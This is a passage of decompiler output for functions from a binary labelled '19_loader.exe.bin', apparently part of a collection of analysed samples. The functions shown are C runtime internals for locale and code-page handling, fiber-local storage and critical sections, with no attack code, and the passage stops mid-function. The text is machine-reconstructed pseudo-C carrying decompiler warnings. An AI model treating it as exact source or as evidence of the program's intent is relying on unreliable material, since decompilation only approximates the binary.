/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140016744(ushort *param_1,uint param_2)

{
  FARPROC pFVar1;
  
  pFVar1 = FUN_140016848(0x14,"LocaleNameToLCID",(uint *)&DAT_14008c038,(uint *)&DAT_14008c040);
  if (pFVar1 == (FARPROC)0x0) {
    FUN_14001cc30(param_1);
  }
  else {
    (*pFVar1)(param_1,(ulonglong)param_2);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x167a8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400167a8 rva=0x167a8 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

INT_PTR FUN_1400167a8(undefined8 param_1)

{
  FARPROC pFVar1;
  INT_PTR IVar2;
  
  pFVar1 = FUN_140016848(0x1a,"AppPolicyGetProcessTerminationMethod",(uint *)&DAT_14008c040,
                         (uint *)&DAT_14008c044);
  if (pFVar1 == (FARPROC)0x0) {
    return 0xc0000225;
  }
  IVar2 = (*pFVar1)(0xfffffffffffffffa,param_1);
  return IVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16804 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016804 rva=0x16804 */

/* WARNING: Removing unreachable block (ram,0x000140016815) */

bool FUN_140016804(void)

{
  FARPROC pFVar1;
  
  pFVar1 = FUN_140016848(3,"FlsGetValue2",(uint *)&DAT_14008c028,(uint *)&DAT_14008c030);
  return pFVar1 != (FARPROC)0x0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16848 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016848 rva=0x16848 */

FARPROC FUN_140016848(uint param_1,LPCSTR param_2,uint *param_3,uint *param_4)

{
  longlong lVar1;
  uint uVar2;
  LPCWSTR lpLibFileName;
  DWORD DVar3;
  int iVar4;
  BOOL BVar5;
  HMODULE hLibModule;
  FARPROC pFVar6;
  FARPROC pFVar7;
  DWORD local_res18 [2];
  
  do {
    if (param_3 == param_4) {
      pFVar7 = (FARPROC)0x0;
LAB_14001693a:
      FUN_140016ab4(0xe);
      local_res18[0] = 0;
      BVar5 = VirtualProtect(&DAT_140093160,0x100,4,local_res18);
      if (BVar5 != 0) {
        pFVar6 = pFVar7;
        if (pFVar7 == (FARPROC)0x0) {
          pFVar6 = (FARPROC)0xffffffffffffffff;
        }
        LOCK();
        (&DAT_140093160)[param_1] = pFVar6;
        UNLOCK();
        BVar5 = VirtualProtect(&DAT_140093160,0x100,2,local_res18);
        if (BVar5 != 0) {
          FUN_140016ad0(0xe);
          return pFVar7;
        }
      }
                    /* WARNING: Subroutine does not return */
      FUN_1400160f8();
    }
    uVar2 = *param_3;
    hLibModule = (HMODULE)(&DAT_1400e0a10)[uVar2];
    if (hLibModule == (HMODULE)0x0) {
      lpLibFileName = (LPCWSTR)(&PTR_u_api_ms_win_core_datetime_l1_1_1_14008bf60)[uVar2];
      hLibModule = LoadLibraryExW(lpLibFileName,(HANDLE)0x0,0x800);
      if ((hLibModule != (HMODULE)0x0) ||
         ((((DVar3 = GetLastError(), DVar3 == 0x57 &&
            (iVar4 = FUN_140019a60((ushort *)lpLibFileName,(ushort *)L"api-ms-",7), iVar4 != 0)) &&
           (iVar4 = FUN_140019a60((ushort *)lpLibFileName,(ushort *)L"ext-ms-",7), iVar4 != 0)) &&
          (hLibModule = LoadLibraryExW(lpLibFileName,(HANDLE)0x0,0), hLibModule != (HMODULE)0x0))))
      {
        LOCK();
        lVar1 = (&DAT_1400e0a10)[uVar2];
        (&DAT_1400e0a10)[uVar2] = hLibModule;
        UNLOCK();
        if (lVar1 != 0) {
          FreeLibrary(hLibModule);
        }
        goto LAB_1400169e0;
      }
      LOCK();
      (&DAT_1400e0a10)[uVar2] = 0xffffffffffffffff;
      UNLOCK();
    }
    else if (hLibModule != (HMODULE)0xffffffffffffffff) {
LAB_1400169e0:
      pFVar7 = GetProcAddress(hLibModule,param_2);
      goto LAB_14001693a;
    }
    param_3 = param_3 + 1;
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x169fc | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400169fc rva=0x169fc */

/* WARNING: Removing unreachable block (ram,0x000140016a11) */
/* WARNING: Removing unreachable block (ram,0x000140016a09) */

FARPROC FUN_1400169fc(void)

{
  FARPROC pFVar1;
  
  pFVar1 = FUN_140016848(1,"CompareStringEx",(uint *)&DAT_14008c020,(uint *)&DAT_14008c028);
  return pFVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16a34 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016a34 rva=0x16a34 */

ulonglong FUN_140016a34(void)

{
  BOOL BVar1;
  undefined4 extraout_var;
  ulonglong uVar2;
  uint uVar3;
  
  uVar2 = 0;
  do {
    BVar1 = InitializeCriticalSectionEx((LPCRITICAL_SECTION)(&DAT_1400e0ad0 + uVar2 * 0x28),4000,0);
    if (BVar1 == 0) {
      uVar2 = FUN_140016a7c();
      return uVar2 & 0xffffffffffffff00;
    }
    DAT_1400e0d28 = DAT_1400e0d28 + 1;
    uVar3 = (int)uVar2 + 1;
    uVar2 = (ulonglong)uVar3;
  } while (uVar3 < 0xf);
  return CONCAT71((int7)(CONCAT44(extraout_var,BVar1) >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16a7c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016a7c rva=0x16a7c */

undefined8 FUN_140016a7c(void)

{
  undefined8 in_RAX;
  undefined8 extraout_RAX;
  ulonglong uVar1;
  
  uVar1 = (ulonglong)DAT_1400e0d28;
  while ((int)uVar1 != 0) {
    uVar1 = (ulonglong)((int)uVar1 - 1);
    DeleteCriticalSection((LPCRITICAL_SECTION)(&DAT_1400e0ad0 + uVar1 * 0x28));
    DAT_1400e0d28 = DAT_1400e0d28 - 1;
    in_RAX = extraout_RAX;
  }
  return CONCAT71((int7)((ulonglong)in_RAX >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16ab4 | partial_markers_remain ===== */
/* address=140016ab4 rva=0x16ab4 */

void FUN_140016ab4(int param_1)

{
                    /* WARNING: Could not recover jumptable at 0x000140016ac6. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  EnterCriticalSection(&DAT_1400e0ad0 + (longlong)param_1 * 0x28);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16ad0 | partial_markers_remain ===== */
/* address=140016ad0 rva=0x16ad0 */

void FUN_140016ad0(int param_1)

{
                    /* WARNING: Could not recover jumptable at 0x000140016ae2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection(&DAT_1400e0ad0 + (longlong)param_1 * 0x28);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16b00 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016b00 rva=0x16b00 */

bool FUN_140016b00(void)

{
  DAT_1400e0d30 = GetProcessHeap();
  return DAT_1400e0d30 != (HANDLE)0x0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16b58 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016b58 rva=0x16b58 */

ulonglong FUN_140016b58(void)

{
  undefined4 uVar1;
  undefined4 extraout_var;
  ulonglong uVar2;
  undefined8 *puVar3;
  undefined4 extraout_var_00;
  
  DAT_1400e0d38 = FUN_140016804();
  DAT_1400dfcb8 = FlsAlloc(FUN_140016d0c);
  uVar2 = CONCAT44(extraout_var,DAT_1400dfcb8);
  if (DAT_1400dfcb8 != 0xffffffff) {
    puVar3 = FUN_140016c20();
    if (puVar3 != (undefined8 *)0x0) {
      return CONCAT71((int7)((ulonglong)puVar3 >> 8),1);
    }
    uVar1 = FUN_140016b9c();
    uVar2 = CONCAT44(extraout_var_00,uVar1);
  }
  return uVar2 & 0xffffffffffffff00;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16b9c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016b9c rva=0x16b9c */

undefined4 FUN_140016b9c(void)

{
  BOOL in_EAX;
  
  if (DAT_1400dfcb8 != 0xffffffff) {
    in_EAX = FlsFree(DAT_1400dfcb8);
    DAT_1400dfcb8 = 0xffffffff;
  }
  return CONCAT31((int3)((uint)in_EAX >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16bc0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016bc0 rva=0x16bc0 */

void FUN_140016bc0(void)

{
  undefined8 *puVar1;
  
  puVar1 = FUN_140016c20();
  if (puVar1 == (undefined8 *)0x0) {
                    /* WARNING: Subroutine does not return */
    FUN_1400160f8();
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16bdc | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016bdc rva=0x16bdc */

void FUN_140016bdc(void)

{
  PVOID pvVar1;
  undefined8 *puVar2;
  
  if (DAT_1400dfcb8 == 0xffffffff) {
    pvVar1 = (PVOID)0x0;
  }
  else {
    pvVar1 = FlsGetValue(DAT_1400dfcb8);
  }
  if (pvVar1 == (PVOID)0xffffffffffffffff) {
LAB_140016c18:
                    /* WARNING: Subroutine does not return */
    FUN_1400160f8();
  }
  if (pvVar1 == (PVOID)0x0) {
    puVar2 = FUN_140016f5c();
    if (puVar2 == (undefined8 *)0x0) goto LAB_140016c18;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16c20 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016c20 rva=0x16c20 */

undefined8 * FUN_140016c20(void)

{
  DWORD dwErrCode;
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar2 = (undefined8 *)0x0;
  if (DAT_1400e0d38 == '\0') {
    dwErrCode = GetLastError();
    if (DAT_1400dfcb8 == 0xffffffff) {
      puVar1 = (undefined8 *)0x0;
    }
    else {
      puVar1 = FlsGetValue(DAT_1400dfcb8);
    }
    if (puVar1 != (undefined8 *)0xffffffffffffffff) {
      if (puVar1 == (undefined8 *)0x0) {
        puVar1 = FUN_140016f5c();
      }
      puVar2 = puVar1;
    }
    SetLastError(dwErrCode);
  }
  else {
    if (DAT_1400dfcb8 == 0xffffffff) {
      puVar1 = (undefined8 *)0x0;
    }
    else {
      puVar1 = (undefined8 *)FUN_14001663c();
    }
    if (puVar1 != (undefined8 *)0xffffffffffffffff) {
      if (puVar1 == (undefined8 *)0x0) {
        puVar1 = FUN_140016f5c();
      }
      puVar2 = puVar1;
    }
  }
  return puVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16cb0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016cb0 rva=0x16cb0 */

undefined8 * FUN_140016cb0(undefined8 param_1,longlong param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar2 = (undefined8 *)0x0;
  if (DAT_1400dfcb8 == 0xffffffff) {
    puVar1 = (undefined8 *)0x0;
  }
  else {
    puVar1 = FlsGetValue(DAT_1400dfcb8);
  }
  if (puVar1 != (undefined8 *)0xffffffffffffffff) {
    if ((puVar1 == (undefined8 *)0x0) && (puVar1 = FUN_140016f5c(), puVar1 == (undefined8 *)0x0)) {
      return (undefined8 *)0x0;
    }
    puVar2 = puVar1 + param_2 * 0x79;
  }
  return puVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16d0c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016d0c rva=0x16d0c */

void FUN_140016d0c(undefined8 *param_1)

{
  if (param_1 != (undefined8 *)0x0) {
    FUN_140016e64(param_1);
    FUN_140017fb0(param_1);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16d2c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016d2c rva=0x16d2c */

void FUN_140016d2c(longlong param_1,longlong param_2)

{
  undefined **ppuVar1;
  
  if (*(longlong *)(param_1 + 0x90) != 0) {
    FUN_140019d40(*(longlong *)(param_1 + 0x90));
    ppuVar1 = *(undefined ***)(param_1 + 0x90);
    if (((ppuVar1 != DAT_1400e1198) && (ppuVar1 != &PTR_DAT_1400e0200)) &&
       (*(int *)(ppuVar1 + 2) == 0)) {
      FUN_140019de8((longlong)ppuVar1);
    }
  }
  *(longlong *)(param_1 + 0x90) = param_2;
  if (param_2 != 0) {
    FUN_140019cb4(param_2);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16d94 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016d94 rva=0x16d94 */

void FUN_140016d94(undefined8 *param_1)

{
  undefined1 local_res10 [8];
  int local_res18 [2];
  int local_res20 [2];
  int local_38 [2];
  undefined8 *local_30;
  undefined8 *local_28;
  undefined8 **local_20;
  undefined8 **local_18;
  undefined8 **local_10;
  
  local_20 = &local_30;
  local_res18[0] = 5;
  local_res20[0] = 5;
  local_18 = &local_30;
  local_10 = &local_28;
  local_38[0] = 4;
  local_38[1] = 4;
  local_28 = &DAT_1400e1198;
  *(undefined4 *)(param_1 + 5) = 1;
  *param_1 = &DAT_14008b760;
  *(undefined4 *)(param_1 + 0x75) = 1;
  param_1[0x11] = &DAT_1400dfcc0;
  *(undefined2 *)((longlong)param_1 + 0xbc) = 0x43;
  *(undefined2 *)((longlong)param_1 + 0x1c2) = 0x43;
  param_1[0x74] = 0;
  local_30 = param_1;
  FUN_140017014(local_res10,local_res20,&local_20,local_res18);
  FUN_140017054(local_res10,local_38 + 1,&local_18,local_38);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16e64 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016e64 rva=0x16e64 */

void FUN_140016e64(undefined8 *param_1)

{
  undefined1 local_res10 [8];
  int local_res18 [2];
  int local_res20 [2];
  int local_28 [2];
  undefined8 *local_20;
  undefined8 **local_18;
  undefined8 **local_10;
  
  local_18 = &local_20;
  local_res18[0] = 5;
  local_res20[0] = 5;
  local_10 = &local_20;
  local_28[0] = 4;
  local_28[1] = 4;
  local_20 = param_1;
  if ((undefined *)*param_1 != &DAT_14008b760) {
    FUN_140017fb0((undefined *)*param_1);
  }
  FUN_140017fb0((LPVOID)local_20[0xe]);
  FUN_140017fb0((LPVOID)local_20[0xb]);
  FUN_140017fb0((LPVOID)local_20[0xc]);
  FUN_140017fb0((LPVOID)local_20[0xd]);
  FUN_140017fb0((LPVOID)local_20[9]);
  FUN_140017fb0((LPVOID)local_20[10]);
  FUN_140017fb0((LPVOID)local_20[0xf]);
  FUN_140017fb0((LPVOID)local_20[0x10]);
  FUN_140017fb0((LPVOID)local_20[0x78]);
  FUN_14001709c(local_res10,local_res20,&local_18,local_res18);
  FUN_1400170fc(local_res10,local_28 + 1,&local_10,local_28);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16f5c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016f5c rva=0x16f5c */

undefined8 * FUN_140016f5c(void)

{
  DWORD dwErrCode;
  BOOL BVar1;
  undefined8 *lpFlsData;
  
  dwErrCode = GetLastError();
  BVar1 = FlsSetValue(DAT_1400dfcb8,(PVOID)0xffffffffffffffff);
  if (BVar1 != 0) {
    lpFlsData = FUN_140019980(1,0x3c8);
    if (lpFlsData != (undefined8 *)0x0) {
      BVar1 = FlsSetValue(DAT_1400dfcb8,lpFlsData);
      if (BVar1 == 0) {
        FlsSetValue(DAT_1400dfcb8,(PVOID)0x0);
        FUN_140017fb0(lpFlsData);
        lpFlsData = (undefined8 *)0x0;
      }
      else {
        FUN_140016d94(lpFlsData);
        FUN_140017fb0((LPVOID)0x0);
      }
      SetLastError(dwErrCode);
      return lpFlsData;
    }
    FlsSetValue(DAT_1400dfcb8,(PVOID)0x0);
    FUN_140017fb0((LPVOID)0x0);
  }
  SetLastError(dwErrCode);
  return (undefined8 *)0x0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x17014 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140017014 rva=0x17014 */

void FUN_140017014(undefined8 param_1,int *param_2,undefined8 *param_3,int *param_4)

{
  FUN_140016ab4(*param_2);
  LOCK();
  **(int **)(*(longlong *)*param_3 + 0x88) = **(int **)(*(longlong *)*param_3 + 0x88) + 1;
  UNLOCK();
  FUN_140016ad0(*param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x17054 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140017054 rva=0x17054 */

void FUN_140017054(undefined8 param_1,int *param_2,undefined8 *param_3,int *param_4)

{
  FUN_140016ab4(*param_2);
  FUN_140016d2c(*(longlong *)*param_3,**(longlong **)param_3[1]);
  FUN_140016ad0(*param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1709c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001709c rva=0x1709c */

void FUN_14001709c(undefined8 param_1,int *param_2,undefined8 *param_3,int *param_4)

{
  int iVar1;
  int *piVar2;
  
  FUN_140016ab4(*param_2);
  piVar2 = *(int **)(*(longlong *)*param_3 + 0x88);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if ((iVar1 == 1) && (piVar2 != (int *)&DAT_1400dfcc0)) {
      FUN_140017fb0(piVar2);
    }
  }
  FUN_140016ad0(*param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x170fc | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400170fc rva=0x170fc */

void FUN_1400170fc(undefined8 param_1,int *param_2,undefined8 *param_3,int *param_4)

{
  FUN_140016ab4(*param_2);
  FUN_140016d2c(*(longlong *)*param_3,0);
  FUN_140016ad0(*param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1713c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001713c rva=0x1713c */

bool FUN_14001713c(void)

{
  int iVar1;
  
  FUN_140016ab4(7);
  iVar1 = FUN_14001b94c(0);
  if (iVar1 == 0) {
    FUN_1400171b8();
    FUN_1400172b8();
  }
  FUN_140016ad0(7);
  return iVar1 == 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x17178 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140017178 rva=0x17178 */

undefined1 FUN_140017178(void)

{
  ulonglong uVar1;
  
  uVar1 = 0;
  do {
    if (*(LPCRITICAL_SECTION *)((longlong)&DAT_1400e0d40 + uVar1) != (LPCRITICAL_SECTION)0x0) {
      FUN_14001b8fc(*(LPCRITICAL_SECTION *)((longlong)&DAT_1400e0d40 + uVar1));
      *(undefined8 *)((longlong)&DAT_1400e0d40 + uVar1) = 0;
    }
    uVar1 = uVar1 + 8;
  } while (uVar1 < 0x400);
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x171b8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400171b8 rva=0x171b8 */

void FUN_1400171b8(void)

{
  longlong lVar1;
  DWORD DVar2;
  ulonglong uVar3;
  byte *pbVar4;
  longlong lVar5;
  uint *puVar6;
  uint uVar7;
  ulonglong uVar8;
  _STARTUPINFOW local_78;
  
  FUN_1400225e0((undefined1 (*) [32])&local_78,0,0x68);
  GetStartupInfoW(&local_78);
  if ((local_78.cbReserved2 != 0) && ((uint *)local_78.lpReserved2 != (uint *)0x0)) {
    puVar6 = (uint *)((longlong)local_78.lpReserved2 + 4);
    pbVar4 = (byte *)((longlong)(int)*(uint *)local_78.lpReserved2 + (longlong)puVar6);
    uVar7 = 0x2000;
    if ((int)*(uint *)local_78.lpReserved2 < 0x2000) {
      uVar7 = *(uint *)local_78.lpReserved2;
    }
    FUN_14001b94c(uVar7);
    if ((int)DAT_1400e1140 < (int)uVar7) {
      uVar7 = DAT_1400e1140;
    }
    uVar8 = (ulonglong)uVar7;
    if (uVar7 != 0) {
      lVar5 = 0;
      do {
        if (((*(longlong *)pbVar4 != -1) && (*(longlong *)pbVar4 != -2)) && ((*puVar6 & 1) != 0)) {
          if ((*puVar6 & 8) == 0) {
            DVar2 = GetFileType(*(HANDLE *)pbVar4);
            if (DVar2 == 0) goto LAB_140017287;
          }
          uVar3 = (ulonglong)((uint)lVar5 & 0x3f);
          lVar1 = (&DAT_1400e0d40)[lVar5 >> 6];
          *(undefined8 *)(lVar1 + 0x28 + uVar3 * 0x48) = *(undefined8 *)pbVar4;
          *(byte *)(lVar1 + 0x38 + uVar3 * 0x48) = (byte)*puVar6;
        }
LAB_140017287:
        lVar5 = lVar5 + 1;
        puVar6 = (uint *)((longlong)puVar6 + 1);
        pbVar4 = pbVar4 + 8;
        uVar8 = uVar8 - 1;
      } while (uVar8 != 0);
    }
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x172b8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400172b8 rva=0x172b8 */

void FUN_1400172b8(void)

{
  byte *pbVar1;
  longlong lVar2;
  DWORD DVar3;
  HANDLE hFile;
  ulonglong uVar4;
  uint uVar5;
  longlong lVar6;
  
  uVar5 = 0;
  lVar6 = 0;
  do {
    uVar4 = (ulonglong)(uVar5 & 0x3f);
    lVar2 = (&DAT_1400e0d40)[(longlong)(int)uVar5 >> 6];
    if (*(longlong *)(lVar2 + 0x28 + uVar4 * 0x48) + 2U < 2) {
      *(undefined1 *)(lVar2 + 0x38 + uVar4 * 0x48) = 0x81;
      if (uVar5 == 0) {
        DVar3 = 0xfffffff6;
      }
      else if (uVar5 == 1) {
        DVar3 = 0xfffffff5;
      }
      else {
        DVar3 = 0xfffffff4;
      }
      hFile = GetStdHandle(DVar3);
      if (1 < (longlong)hFile + 1U) {
        DVar3 = GetFileType(hFile);
        if (DVar3 != 0) {
          *(HANDLE *)(lVar2 + 0x28 + uVar4 * 0x48) = hFile;
          if ((DVar3 & 0xff) == 2) {
            pbVar1 = (byte *)(lVar2 + 0x38 + uVar4 * 0x48);
            *pbVar1 = *pbVar1 | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            pbVar1 = (byte *)(lVar2 + 0x38 + uVar4 * 0x48);
            *pbVar1 = *pbVar1 | 8;
          }
          goto LAB_140017396;
        }
      }
      pbVar1 = (byte *)(lVar2 + 0x38 + uVar4 * 0x48);
      *pbVar1 = *pbVar1 | 0x40;
      *(undefined8 *)(lVar2 + 0x28 + uVar4 * 0x48) = 0xfffffffffffffffe;
      if (DAT_1400e11a8 != 0) {
        *(undefined4 *)(*(longlong *)(lVar6 + DAT_1400e11a8) + 0x18) = 0xfffffffe;
      }
    }
    else {
      pbVar1 = (byte *)(lVar2 + 0x38 + uVar4 * 0x48);
      *pbVar1 = *pbVar1 | 0x80;
    }
LAB_140017396:
    uVar5 = uVar5 + 1;
    lVar6 = lVar6 + 8;
    if (uVar5 == 3) {
      return;
    }
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x173c0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400173c0 rva=0x173c0 */

void FUN_1400173c0(void)

{
  longlong lVar1;
  
  lVar1 = FUN_140016bc0();
  FUN_1400178b8(lVar1,&DAT_1400e1158);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x173dc | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400173dc rva=0x173dc */

undefined8 FUN_1400173dc(void)

{
  int iVar1;
  undefined8 in_RAX;
  longlong lVar2;
  undefined4 extraout_var;
  
  if (DAT_1400e1164 == '\0') {
    DAT_1400e1150 = &DAT_1400e0000;
    DAT_1400e1158 = &DAT_1400dfcc0;
    DAT_1400e1148 = &DAT_1400dfef0;
    lVar2 = FUN_140016bdc();
    iVar1 = FUN_140017970(0xfffffffd,'\x01',lVar2,&DAT_1400e1158);
    in_RAX = CONCAT44(extraout_var,iVar1);
    DAT_1400e1164 = '\x01';
  }
  return CONCAT71((int7)((ulonglong)in_RAX >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1743c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001743c rva=0x1743c */

longlong * FUN_14001743c(longlong *param_1,undefined4 *param_2)

{
  longlong *plVar1;
  uint uVar2;
  longlong lVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  
  *(undefined1 *)(param_1 + 3) = 0;
  plVar1 = param_1 + 1;
  if (param_2 == (undefined4 *)0x0) {
    if (DAT_1400e07f8 != 0) {
      lVar3 = FUN_140016bc0();
      *param_1 = lVar3;
      *plVar1 = *(longlong *)(lVar3 + 0x90);
      param_1[2] = *(longlong *)(lVar3 + 0x88);
      FUN_14001d0a4(lVar3,plVar1);
      FUN_14001d0d8(*param_1,param_1 + 2);
      uVar2 = *(uint *)(*param_1 + 0x3a8);
      if ((uVar2 & 2) == 0) {
        *(uint *)(*param_1 + 0x3a8) = uVar2 | 2;
        *(undefined1 *)(param_1 + 3) = 1;
        return param_1;
      }
      return param_1;
    }
    uVar4 = PTR_PTR_1400e0358._0_4_;
    uVar5 = PTR_PTR_1400e0358._4_4_;
    uVar6 = PTR_DAT_1400e0360._0_4_;
    uVar7 = PTR_DAT_1400e0360._4_4_;
  }
  else {
    uVar4 = *param_2;
    uVar5 = param_2[1];
    uVar6 = param_2[2];
    uVar7 = param_2[3];
  }
  *(undefined4 *)plVar1 = uVar4;
  *(undefined4 *)((longlong)param_1 + 0xc) = uVar5;
  *(undefined4 *)(param_1 + 2) = uVar6;
  *(undefined4 *)((longlong)param_1 + 0x14) = uVar7;
  return param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x174d8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400174d8 rva=0x174d8 */

void FUN_1400174d8(UINT param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  int iVar3;
  UINT CodePage;
  BOOL BVar4;
  UINT *pUVar5;
  byte *pbVar6;
  wchar_t *pwVar7;
  longlong lVar8;
  BYTE *pBVar9;
  ulonglong uVar10;
  byte *pbVar11;
  undefined2 *puVar12;
  undefined4 uVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  byte *pbVar17;
  undefined1 auStack_68 [32];
  _cpinfo local_48;
  ulonglong local_30;
  
  local_30 = DAT_1400dfc40 ^ (ulonglong)auStack_68;
  local_48.MaxCharSize = 0;
  local_48.DefaultChar[0] = '\0';
  local_48.DefaultChar[1] = '\0';
  local_48.LeadByte[0] = '\0';
  local_48.LeadByte[1] = '\0';
  local_48.LeadByte[2] = '\0';
  local_48.LeadByte[3] = '\0';
  local_48.LeadByte[4] = '\0';
  local_48.LeadByte[5] = '\0';
  local_48.LeadByte[6] = '\0';
  local_48.LeadByte[7] = '\0';
  local_48.LeadByte[8] = '\0';
  local_48.LeadByte[9] = '\0';
  local_48.LeadByte[10] = '\0';
  local_48.LeadByte[0xb] = '\0';
  local_48._18_2_ = 0;
  CodePage = FUN_1400177a0(param_1);
  pwVar7 = (wchar_t *)0x0;
  if (CodePage != 0) {
    uVar16 = 0;
    pUVar5 = &DAT_1400e0110;
    uVar13 = 1;
LAB_14001752f:
    if (*pUVar5 != CodePage) goto code_r0x000140017537;
    FUN_1400225e0((undefined1 (*) [32])(param_2 + 0x18),0,0x101);
    pbVar17 = &DAT_1400e0100;
    lVar8 = 4;
    pbVar6 = &DAT_1400e0120 + (ulonglong)uVar16 * 0x30;
    do {
      bVar2 = *pbVar6;
      pbVar11 = pbVar6;
      while ((bVar2 != 0 && (pbVar11[1] != 0))) {
        bVar2 = *pbVar11;
        uVar14 = (uint)bVar2;
        if (bVar2 <= pbVar11[1]) {
          uVar15 = (uint)bVar2;
          do {
            uVar15 = uVar15 + 1;
            if (0x100 < uVar15) break;
            uVar14 = uVar14 + 1;
            pbVar1 = (byte *)((ulonglong)uVar15 + 0x18 + param_2);
            *pbVar1 = *pbVar1 | *pbVar17;
          } while (uVar14 <= pbVar11[1]);
        }
        pbVar11 = pbVar11 + 2;
        bVar2 = *pbVar11;
      }
      pbVar6 = pbVar6 + 8;
      pbVar17 = pbVar17 + 1;
      lVar8 = lVar8 + -1;
    } while (lVar8 != 0);
    *(UINT *)(param_2 + 4) = CodePage;
    *(undefined4 *)(param_2 + 8) = 1;
    if (CodePage == 0x3a4) {
      pwVar7 = L"ja-JP";
    }
    else if (CodePage == 0x3a8) {
      pwVar7 = L"zh-CN";
    }
    else if (CodePage == 0x3b5) {
      pwVar7 = L"ko-KR";
    }
    else if (CodePage == 0x3b6) {
      pwVar7 = L"zh-TW";
    }
    *(wchar_t **)(param_2 + 0x220) = pwVar7;
    puVar12 = (undefined2 *)(param_2 + 0xc);
    lVar8 = 6;
    do {
      *puVar12 = *(undefined2 *)
                  (((ulonglong)uVar16 * 0x30 - param_2) + 0x1400e0108 + (longlong)puVar12);
      puVar12 = puVar12 + 1;
      lVar8 = lVar8 + -1;
    } while (lVar8 != 0);
    goto LAB_140017766;
  }
LAB_140017770:
  FUN_140017820(param_2);
LAB_14001777a:
  FUN_14001a2d0(local_30 ^ (ulonglong)auStack_68);
  return;
code_r0x000140017537:
  uVar16 = uVar16 + 1;
  pUVar5 = pUVar5 + 0xc;
  if (4 < uVar16) goto code_r0x000140017544;
  goto LAB_14001752f;
code_r0x000140017544:
  if ((CodePage == 65000) || (BVar4 = IsValidCodePage(CodePage & 0xffff), BVar4 == 0))
  goto LAB_14001777a;
  if (CodePage == 0xfde9) {
    *(undefined8 *)(param_2 + 4) = 0xfde9;
    *(undefined8 *)(param_2 + 0x220) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
    *(undefined2 *)(param_2 + 0x1c) = 0;
  }
  else {
    BVar4 = GetCPInfo(CodePage,&local_48);
    if (BVar4 == 0) {
